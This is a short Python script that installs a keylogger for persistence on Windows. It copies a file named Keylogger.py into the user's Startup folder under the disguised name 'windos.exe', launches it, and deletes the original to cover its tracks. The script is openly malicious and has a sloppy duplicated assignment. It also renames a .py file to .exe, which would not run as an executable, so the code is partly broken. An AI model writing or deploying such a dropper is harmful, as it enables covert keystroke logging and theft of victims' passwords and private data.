###

# Copy the file and set startup and delete files

###



import os
import shutil
import getpass


USER_NAME = getpass.getuser()
bat_path = USER_NAME = getpass.getuser()


bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME


path_Keylogger=r"Keylogger.py"
startup=r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windos.exe' % USER_NAME




shutil.copyfile(path_Keylogger,startup)
#copy file and paste



os.startfile(startup)  
# #open file
# 

# 
os.remove("Keylogger.py")
# delete on file